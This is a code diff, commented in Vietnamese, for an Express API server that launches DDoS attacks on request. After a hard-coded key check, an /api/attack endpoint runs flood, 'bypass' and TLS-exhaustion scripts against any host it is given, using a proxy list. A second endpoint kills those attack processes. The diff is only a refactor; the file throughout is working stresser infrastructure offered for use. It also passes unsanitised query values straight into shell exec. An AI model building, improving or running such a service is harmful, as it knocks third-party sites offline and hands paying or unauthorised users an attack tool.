@@ -5,9 +5,10 @@ const axios = require("axios");
 const app = express();
 const port = 9999;
 
-let activeAttacks = 0;
 const maxConcurrentAttacks = 1;
+let activeAttacks = 0;
 
+// Lấy IP công cộng
 const getPublicIP = async () => {
   try {
     const { data } = await axios.get('https://api.ipify.org?format=json');
@@ -18,7 +19,8 @@ const getPublicIP = async () => {
   }
 };
 
-const validateInput = (key, host, time, method, port) => {
+// Kiểm tra dữ liệu đầu vào
+const validateInput = ({ key, host, time, method, port }) => {
   if (![key, host, time, method, port].every(Boolean)) return "Thiếu tham số yêu cầu";
   if (key !== "negan") return "Invalid Key";
   if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
@@ -29,6 +31,7 @@ const validateInput = (key, host, time, method, port) => {
   return null;
 };
 
+// Thực thi lệnh tấn công
 const executeAttack = (command, clientIP) => {
   exec(command, (error, stdout, stderr) => {
     if (stderr) console.error(stderr);
@@ -37,44 +40,51 @@ const executeAttack = (command, clientIP) => {
   });
 };
 
+// Lấy PID của tiến trình
+const getPidsByProcess = (process) => {
+  return new Promise((resolve, reject) => {
+    exec(`pgrep -f ${process}`, (error, stdout, stderr) => {
+      if (stderr || error) reject(stderr || error);
+      resolve(stdout.trim().split("\n"));
+    });
+  });
+};
+
+// Dừng tiến trình
+const killProcess = (process) => {
+  return new Promise((resolve, reject) => {
+    exec(`pkill -f -9 ${process}`, (error, stdout, stderr) => {
+      if (stderr || error) reject(stderr || error);
+      console.log(`Đã dừng tiến trình ${process}`);
+      resolve();
+    });
+  });
+};
+
+// Xử lý các tiến trình và trả về danh sách PID đã dừng
 const pkillProcesses = async () => {
   const processes = ["flood", "killer", "bypass", "tlskill", "priv-flood"];
   let pidList = [];
 
-  // Sử dụng Promise.all để đồng bộ các lệnh exec
-  await Promise.all(processes.map((process) => {
-    return new Promise((resolve, reject) => {
-      const command = `pgrep -f ${process}`; // Lấy PID của các tiến trình có tên process
-      exec(command, (error, stdout, stderr) => {
-        if (stderr) {
-          reject(stderr);
-        }
+  for (let process of processes) {
+    try {
+      const pids = await getPidsByProcess(process);
+      pidList.push(...pids);
+      await killProcess(process);
+    } catch (err) {
+      console.error(`Lỗi khi xử lý tiến trình ${process}: ${err}`);
+    }
+  }
 
-        const pids = stdout.trim().split("\n"); // Lấy các PID và chia thành mảng
-        pidList = pidList.concat(pids); // Thêm vào danh sách PID
-
-        console.log(`PID của tiến trình ${process}: ${pids.join(", ")}`);
-
-        // Sau khi lấy các PID, thực hiện lệnh pkill
-        const killCommand = `pkill -f -9 ${process}`;
-        exec(killCommand, (killError, killStdout, killStderr) => {
-          if (killStderr) reject(killStderr);
-          console.log(`Đã dừng tiến trình ${process}`);
-          resolve();
-        });
-      });
-    });
-  }));
-
-  // Trả về danh sách các PID bị dừng sau khi pkill
   return pidList;
 };
 
+// API tấn công
 app.get("/api/attack", (req, res) => {
   const { key, host, time, method, port } = req.query;
   const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
 
-  const validationMessage = validateInput(key, host, time, method, port);
+  const validationMessage = validateInput({ key, host, time, method, port });
   if (validationMessage) return res.status(400).json({ status: "error", message: validationMessage });
 
   if (activeAttacks >= maxConcurrentAttacks) {
@@ -82,46 +92,46 @@ app.get("/api/attack", (req, res) => {
   }
 
   activeAttacks++;
-  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
 
   // Tạo lệnh tấn công dựa trên phương thức
-  let command = "";
-  switch (method.toLowerCase()) {
-    case "flood":
-      command = `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`;
-      break;
-    case "killer":
-      command = `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`;
-      break;
-    case "bypass":
-      command = `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`;
-      break;
-    case "tlskill":
-      command = `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`;
-      break;
-    case "priv-flood":
-      command = `node --max-old-space-size=65536 priv-flood -m GET -u ${host} -s ${time} -p live.txt --ratelimit true --full true`;
-      break;
+  const commands = {
+    "flood": `node --max-old-space-size=65536 flood ${host} ${time} 10 10 live.txt flood`,
+    "killer": `node --max-old-space-size=65536 killer GET ${host} ${time} 10 10 live.txt`,
+    "bypass": `node --max-old-space-size=65536 bypass ${host} ${time} 10 10 live.txt bypass --redirect true --ratelimit true --query true`,
+    "tlskill": `node --max-old-space-size=65536 tlskill ${host} ${time} 10 10 live.txt --icecool true --dual true --brave true`,
+    "priv-flood": `node --max-old-space-size=65536 priv-flood -m GET -u ${host} -s ${time} -p live.txt --ratelimit true --full true`
+  };
+
+  const command = commands[method.toLowerCase()];
+  if (!command) {
+    return res.status(400).json({ status: "error", message: "Phương thức tấn công không hợp lệ" });
   }
 
   executeAttack(command, clientIP);
+  res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
 });
 
+// API pkill
 app.get("/api/pkill", async (req, res) => {
   const { pkill } = req.query;
 
   if (pkill === "true") {
-    const pidList = await pkillProcesses();
-    res.status(200).json({
-      status: "success",
-      message: "Đã dừng tất cả các tiến trình tấn công.",
-      pids: pidList.join(", ") // Trả về danh sách PID của các tiến trình đã dừng
-    });
+    try {
+      const pidList = await pkillProcesses();
+      res.status(200).json({
+        status: "success",
+        message: "Đã dừng tất cả các tiến trình tấn công.",
+        pids: pidList.join(", ")
+      });
+    } catch (error) {
+      res.status(500).json({ status: "error", message: "Lỗi khi dừng tiến trình", error });
+    }
   } else {
-    return res.status(400).json({ status: "error", message: "Tham số pkill không hợp lệ." });
+    res.status(400).json({ status: "error", message: "Tham số pkill không hợp lệ." });
   }
 });
 
+// Khởi động server
 getPublicIP().then((ip) => {
   app.listen(port, () => {
     console.log(`[Máy chủ API] đang chạy trên > ${ip}:${port}`);
